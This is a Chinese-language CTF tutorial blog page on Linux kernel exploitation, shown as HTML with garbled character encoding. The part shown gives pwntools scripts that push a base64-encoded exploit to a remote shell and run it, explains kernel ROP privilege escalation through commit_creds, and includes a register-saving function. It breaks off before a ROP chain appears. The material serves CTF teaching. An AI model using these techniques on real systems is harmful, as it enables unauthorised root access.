

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="å®ä¹Ÿæ˜¯å¸¦é»‘é˜”ï¼Ÿ">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF">
<meta property="og:url" content="http://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="å®ä¹Ÿæ˜¯å¸¦é»‘é˜”ï¼Ÿ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/03/03/JXPaRGtvIKU3rzk.png">
<meta property="article:published_time" content="2021-03-03T07:36:24.000Z">
<meta property="article:modified_time" content="2023-08-14T03:48:31.122Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Linux Kernel">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="Use After Free">
<meta property="article:tag" content="Kernel UAF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/03/03/JXPaRGtvIKU3rzk.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/03/03/qC9eGRgHU3axBJW.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-03-03 18:36" pubdate>
          2021å¹´3æœˆ3æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          148k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1236 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2023å¹´8æœˆ14æ—¥ ä¸‹åˆ
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>å®ä¹Ÿæ˜¯å¸¦é»‘é˜”ï¼Ÿ</p>
<span id="more"></span>

<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>æ¯«æ— ç–‘é—®ï¼Œå¯¹äºå†…æ ¸æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œå¹¶æœ€ç»ˆææƒåˆ° rootï¼Œåœ¨é»‘å®¢ç•Œæ˜¯ä¸€ç§æœ€ä¸º old school çš„ç¾å­¦ ï¼š)</p>
<p>è€ŒCTFä¸­çš„ kernel pwn ç±»å‹çš„é¢˜ç›®åˆ™æ°å¥½æ˜¯å…¥é—¨ kernel exploit æœ€å¥½çš„æ–¹å¼ä¹‹ä¸€ï¼Œå› æ­¤æœ¬ç¯‡åšå®¢ç”±æµ…å…¥æ·±ç®€å•è®²è®² CTF ä¸­å‡ ç§è¾ƒä¸ºå¸¸è§çš„ kernel åˆ©ç”¨æ–¹å¼ï¼ŒåŒæ—¶ä¸ºäº†è®©å¤§å®¶äº†è§£æ›´å¤šçš„åˆ©ç”¨æ‰‹æ³•ï¼Œ<strong>ç¬”è€…æ¯é“é¢˜éƒ½ä¼šå°½é‡é‡‡ç”¨ä¸åŒçš„ç»“æ„ä½“è¿›è¡Œåˆ©ç”¨ ï¼š)</strong></p>
<p>å…³äºå†…æ ¸å¸¸è§çš„å‡ ç§ä¿æŠ¤æœºåˆ¶ï¼Œå‚è§<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#0x08-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6">è¿™é‡Œ</a></p>
<p> <strong>âœ³ kernel pwnä¸ç”¨æˆ·æ€çš„pwnåœ¨æœ¬è´¨ä¸Šå¹¶æ— å·®åˆ«</strong></p>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCTFä¸­çš„kernel pwné€šå¸¸ä¸ä¼šè®©é€‰æ‰‹å»çœŸæ­£å¯»æ‰¾å†…æ ¸ä¸­çš„æ¼æ´ï¼Œè€Œé€šå¸¸æ˜¯ç»™å‡ºä¸€ä¸ªæœ‰æ¼æ´çš„LKMè®©é€‰æ‰‹è¿›è¡Œåˆ†æ</p>
<blockquote>
<p>ä½†å¦‚æœä½ æœ‰ä¸€ä¸ª kernel 0day ä½ ä¾¿å¯ä»¥é€šæ€å¤§éƒ¨åˆ†æ¯”èµ›çš„ kernel pwn é¢˜  ï¼š)</p>
</blockquote>
</blockquote>
<blockquote>
<p>æœ¬ç¯‡åšå®¢è™½ç„¶æœ€åˆå†™äº 2021 å¹´ï¼Œä½†å¶å°”ä¹Ÿä¼šæ ¹æ®å†…æ ¸çš„ä¸€äº›å‘å±•å˜è¿è¿›è¡Œå°éƒ¨åˆ†å˜åŠ¨ï¼šï¼‰</p>
</blockquote>
<h2 id="æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼"><a href="#æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼" class="headerlink" title="æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼"></a>æ–‡ä»¶è¿œç¨‹ä¼ è¾“æ–¹å¼</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨CTFä¸­ä¸€ä¸ªç”¨ä½œ exploit çš„é™æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯é€šå¸¸å¯ä»¥è¾¾åˆ°æ•°ç™¾KBç”šè‡³å‡ Må¾€ä¸Šï¼Œæˆ‘ä»¬æ²¡æ³•å¾ˆæ–¹ä¾¿åœ°å°†å…¶ç›´æ¥ä¸Šä¼ åˆ°æœåŠ¡å™¨</p>
<p>ç›®å‰æ¥è¯´æ¯”è¾ƒé€šç”¨çš„åŠæ³•ä¾¿æ˜¯å°† exploit è¿›è¡Œ base64 ç¼–ç åä¼ è¾“ï¼Œå¯å‚è€ƒç¬”è€…æ‰€ç»™å‡ºçš„å¦‚ä¸‹è„šæœ¬ï¼š</p>
<blockquote>
<p>ç¬”è€…ä¼˜åŒ–åçš„æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">11451</span>)<br><span class="hljs-comment">#p = process(&#x27;./run.sh&#x27;)</span><br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>    <br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<blockquote>
<p>ç¬”è€…æ—©æœŸå†™çš„æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time, os<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;./boot.sh&#x27;</span>)<span class="hljs-comment">#remote(&quot;127.0.0.1&quot;, 5555)</span><br><br>os.system(<span class="hljs-string">&quot;tar -czvf exp.tar.gz ./exploit&quot;</span>)<br>os.system(<span class="hljs-string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./b64_exp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br><br>p.sendline()<br>p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)<br><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;now line: &#x27;</span> + <span class="hljs-built_in">str</span>(count))<br>    line = f.readline().replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)&lt;=<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    cmd = <span class="hljs-string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="hljs-string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span><br>    p.sendline(cmd) <span class="hljs-comment"># send lines</span><br>    <span class="hljs-comment">#time.sleep(0.02)</span><br>    <span class="hljs-comment">#p.recv()</span><br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>    count += <span class="hljs-number">1</span><br>f.close()<br><br>p.sendline(<span class="hljs-string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;tar -xzvf exp.tar.gz&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;chmod +x ./exploit;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;./exploit&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç›¸æ¯”èµ·å¸¸è§„çš„ pwn é¢˜ï¼Œkernel pwn æ‰“è¿œç¨‹ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ¼«é•¿çš„è¿‡ç¨‹ï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„æ—¶é—´éƒ½ä¼šèŠ±åœ¨è¿™ä¸ªæ–‡ä»¶ä¼ è¾“ä¸Š</p>
<p>å¯¹äºéƒ¨åˆ†ä¸éœ€è¦ä¸€äº›é¢å¤–åŠŸèƒ½ï¼ˆå¦‚userfaultfdï¼‰çš„é¢˜ç›®å¯ä»¥ä½¿ç”¨ musl-C åº“æ¥å¤§å¹…é™ä½å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°</p>
<p>å¯¹äºæ—¶é—´æ¯”è¾ƒå……è¶³çš„é¢˜ç›®ç¬”è€…æ¨èä½¿ç”¨çº¯æ±‡ç¼–æ¥ç¼–å†™expï¼ˆç¬‘ï¼‰</p>
<blockquote>
<p>è‹¥æ˜¯è¿æ°”ä¸å¤§å¥½æˆ–è€…ç½‘é€Ÿå¤ªæ…¢ï¼Œé‚£ä¹ˆä½ å¯èƒ½ä¼šéœ€è¦ä»å¤´æ¥è¿‡â€¦</p>
<p><img src="https://i.loli.net/2021/07/21/VI1wAplsh2W5UYg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<h2 id="ç¬”è€…è‡ªç”¨æ¨¡æ¿"><a href="#ç¬”è€…è‡ªç”¨æ¨¡æ¿" class="headerlink" title="ç¬”è€…è‡ªç”¨æ¨¡æ¿"></a><em>ç¬”è€…è‡ªç”¨æ¨¡æ¿</em></h2><p>ç¬”è€…å°† kernel pwn ä¸­å¸¸ç”¨çš„ä¸€äº›æ•°æ®ã€å‡½æ•°ç­‰ç­‰å°è£…åœ¨ä¸€ä¸ªå¤´æ–‡ä»¶ <code>kernelpwn.h</code> ä¸­ï¼Œå°è£…å¥½äº†ä¸€äº›å¦‚ userfaultfdã€keyctlã€msg_msg ç­‰çš„å¸¸ç”¨ç‰©</p>
<blockquote>
<p>ç¬”è€…æŒ‰å‡½æ•°å‘½åæ³•åˆ†æˆäº†ä¸¤ç§ï¼ˆå› ä¸ºç¬”è€…ä»¥å‰å–œæ¬¢å°é©¼å³°ç°åœ¨å–œæ¬¢ä¸‹åˆ’çº¿ğŸ˜€ï¼‰ï¼š</p>
<ul>
<li><p>ä¸‹åˆ’çº¿ç‰ˆæœ¬ï¼š <a href="/download/pwn_tools/kernelpwn.h" title="ç‚¹å‡»æ­¤å¤„è¿›è¡Œä¸‹è½½">kernelpwn.h</a></p>
</li>
<li><p>å°é©¼å³°ç‰ˆæœ¬ï¼ˆä¸å†æ›´æ–°ï¼‰ï¼š <a href="/download/kernelpwn.h" title="ç‚¹å‡»æ­¤å¤„è¿›è¡Œä¸‹è½½">kernelpwn.h</a></p>
</li>
</ul>
</blockquote>
<p><del>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ musl åº“ç¼ºå°‘å¾ˆå¤šçš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¯¥æ¨¡æ¿ä»…é€‚ç”¨äº glibcï¼Œå¦‚æœè¦ç”¨ musl ç¼–è¯‘çš„è¯éœ€è¦å¤§å®¶è‡ªè¡Œä¿®æ”¹ï¼š(</del></p>
<p>ç°åœ¨ä¸‹åˆ’çº¿ç‰ˆæœ¬è‡ªç”¨æ¨¡æ¿å·²ç»æ”¯æŒä½¿ç”¨ musl ç¼–è¯‘ï¼šï¼‰</p>
<h1 id="0x01-Kernel-ROP-basic"><a href="#0x01-Kernel-ROP-basic" class="headerlink" title="0x01.Kernel ROP - basic"></a>0x01.Kernel ROP - basic</h1><p>ROPå³<code>è¿”å›å¯¼å‘ç¼–ç¨‹</code>ï¼ˆReturn-oriented programmingï¼‰ï¼Œåº”å½“æ˜¯å¤§å®¶æ¯”è¾ƒç†Ÿæ‚‰çš„ä¸€ç§æ”»å‡»æ–¹å¼â€”â€”é€šè¿‡å¤ç”¨ä»£ç ç‰‡æ®µçš„æ–¹å¼æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p>
<p>âœ³ <strong>å†…æ ¸æ€çš„ ROP ä¸ç”¨æˆ·æ€çš„ ROP ä¸€èˆ¬æ— äºŒï¼Œåªä¸è¿‡åˆ©ç”¨çš„ gadget å˜æˆäº†å†…æ ¸ä¸­çš„ gadgetï¼Œæ‰€éœ€è¦æ„é€ æ‰§è¡Œçš„ ropchain ç”±</strong><code>system(&quot;/bin/sh&quot;)</code><strong>å˜ä¸ºäº†</strong> <code>commit_creds(prepare_kernel_cred(&amp;init_task)) æˆ– commit_creds(&amp;init_cred)</code></p>
<p>å½“æˆåŠŸæ‰§è¡Œå¦‚ä¸Šå‡½æ•°ä¹‹åï¼Œå½“å‰çº¿ç¨‹çš„ cred ç»“æ„ä½“ä¾¿å˜ä¸º init è¿›ç¨‹çš„ cred çš„æ‹·è´ï¼Œæˆ‘ä»¬ä¹Ÿå°±è·å¾—äº† root æƒé™ï¼Œæ­¤æ—¶åœ¨ç”¨æˆ·æ€èµ·ä¸€ä¸ª shell ä¾¿èƒ½è·å¾— root shell</p>
<ul>
<li>éœ€è¦æ³¨æ„çš„æ˜¯ <strong>æ—§ç‰ˆæœ¬å†…æ ¸ä¸Šæ‰€ç”¨çš„ææƒæ–¹æ³• <code>commit_creds(prepare_kernel_cred(NULL))</code> å·²ç»ä¸å†èƒ½è¢«ä½¿ç”¨ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„å†…æ ¸å½“ä¸­ <code>prepare_kernel_cred(NULL)</code> å°†ä¸å†è¿”å›ä¸€ä¸ª root cred</strong>ï¼Œè¿™ä¹Ÿä»¤ ROP chain çš„æ„é€ å˜ä¸ºæ›´åŠ å›°éš¾ ï¼š(</li>
</ul>
<h2 id="çŠ¶æ€ä¿å­˜"><a href="#çŠ¶æ€ä¿å­˜" class="headerlink" title="çŠ¶æ€ä¿å­˜"></a>çŠ¶æ€ä¿å­˜</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„exploitéœ€è¦è¿›å…¥åˆ°å†…æ ¸å½“ä¸­å®Œæˆææƒï¼Œè€Œæˆ‘ä»¬æœ€ç»ˆä»ç„¶éœ€è¦<strong>ç€é™†å›ç”¨æˆ·æ€</strong>ä»¥è·å¾—ä¸€ä¸ªrootæƒé™çš„shellï¼Œå› æ­¤åœ¨æˆ‘ä»¬çš„exploitè¿›å…¥å†…æ ¸æ€ä¹‹å‰æˆ‘ä»¬éœ€è¦<strong>æ‰‹åŠ¨æ¨¡æ‹Ÿç”¨æˆ·æ€è¿›å…¥å†…æ ¸æ€çš„å‡†å¤‡å·¥ä½œ</strong>â€”â€”<strong>ä¿å­˜å„å¯„å­˜å™¨çš„å€¼åˆ°å†…æ ¸æ ˆä¸Š</strong>ï¼Œä»¥ä¾¿äºåç»­ç€é™†å›ç”¨æˆ·æ€</p>
<p>é€šå¸¸æƒ…å†µä¸‹ä½¿ç”¨å¦‚ä¸‹å‡½æ•°ä¿å­˜å„å¯„å­˜å™¨å€¼åˆ°æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å˜é‡ä¸­ï¼Œä»¥ä¾¿äºæ„é€  rop é“¾ï¼š</p>
<blockquote>
<p>ç®—æ˜¯ä¸€ä¸ªé€šç”¨çš„pwnæ¿å­</p>
<p>æ–¹ä¾¿èµ·è§ï¼Œä½¿ç”¨äº†å†…è”æ±‡ç¼–ï¼Œç¼–è¯‘æ—¶éœ€è¦æŒ‡å®šå‚æ•°ï¼š<code>-masm=intel</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="è¿”å›ç”¨æˆ·æ€"><a href="#è¿”å›ç”¨æˆ·æ€" class="headerlink" title="è¿”å›ç”¨æˆ·æ€"></a>è¿”å›ç”¨æˆ·æ€</h2><p>åœ¨<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#IV-%E5%86%85%E6%A0%B8%E6%80%81-%E2%80%94-gt-%E7%94%A8%E6%88%B7%E6%80%81"> è¿™ç¯‡åšå®¢ </a>å½“ä¸­ç¬”è€…ç®€è¦å™è¿°äº†å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€çš„è¿‡ç¨‹ï¼š</p>
<ul>
<li><code>swapgs</code>æŒ‡ä»¤æ¢å¤ç”¨æˆ·æ€GSå¯„å­˜å™¨</li>
<li><code>sysretq</code>æˆ–è€…<code>iretq</code>æ¢å¤åˆ°ç”¨æˆ·ç©ºé—´</li>
</ul>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨å†…æ ¸ä¸­æ‰¾åˆ°ç›¸åº”çš„gadgetå¹¶æ‰§è¡Œ<code>swapgs;iretq</code>å°±å¯ä»¥æˆåŠŸç€é™†å›ç”¨æˆ·æ€</p>
<p>é€šå¸¸æ¥è¯´ï¼Œæˆ‘ä»¬åº”å½“æ„é€ å¦‚ä¸‹ropé“¾ä»¥è¿”å›ç”¨æˆ·æ€å¹¶è·å¾—ä¸€ä¸ªshellï¼š</p>
